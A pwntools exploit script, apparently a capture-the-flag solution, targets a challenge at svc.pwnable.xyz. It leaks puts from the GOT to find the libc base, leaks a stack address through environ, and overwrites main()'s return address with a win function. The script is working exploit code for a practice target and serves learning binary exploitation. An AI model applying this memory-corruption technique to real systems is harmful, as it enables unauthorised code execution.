from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
    puts_offset = 0x80970 # offset of puts() from libc base
    environ_offset = 0x61c118 # offset of environ from libc base
else:
    r = remote('svc.pwnable.xyz', 30019)
    puts_offset = 0x6fd60 # offset of puts() from libc base
    environ_offset = 0x3ba098 # offset of environ from libc base

sla = r.sendlineafter

def read(addr):
    sla('> ', '1')
    sla('Addr: ', str(addr))

def write(addr, value):
    sla('> ', '2')
    sla('Addr: ', str(addr))
    sla('Value: ', str(value))

puts_got = 0x600fa0
win = 0x400905


# libc leak

read(puts_got)

puts = u64(r.recvline()[:-1].ljust(8, b'\x00'))
libc = puts - puts_offset # libc base
log.info('libc base: ' + hex(libc))
environ = libc + environ_offset


# stack leak

read(environ)

rbp = u64(r.recvline()[:-1].ljust(8, b'\x00')) - 0xf8 # rbp of main()
log.info('rbp of main(): ' + hex(rbp))


# RET overwrite

write(rbp + 8, win)

sla('> ', '0') # return main()


r.interactive()